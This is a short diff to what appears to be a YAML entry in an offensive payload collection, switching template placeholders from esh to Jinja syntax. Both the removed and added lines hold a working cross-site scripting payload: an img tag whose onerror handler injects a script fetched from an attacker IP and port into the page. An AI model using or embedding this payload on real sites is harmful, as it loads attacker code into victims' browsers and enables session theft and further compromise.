@@ -6,4 +6,4 @@ metadata:
   author: "Unknown"
 
 content: |
-  <img src=x onerror="var script1=document.createElement('script');script1.src='http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/<scriptname.js>';document.head.appendChild(script1);"/>
+  <img src=x onerror="var script1=document.createElement('script');script1.src='http://{{ attacker_ip }}:{{ delivery_outbound_port }}/<scriptname.js>';document.head.appendChild(script1);"/>
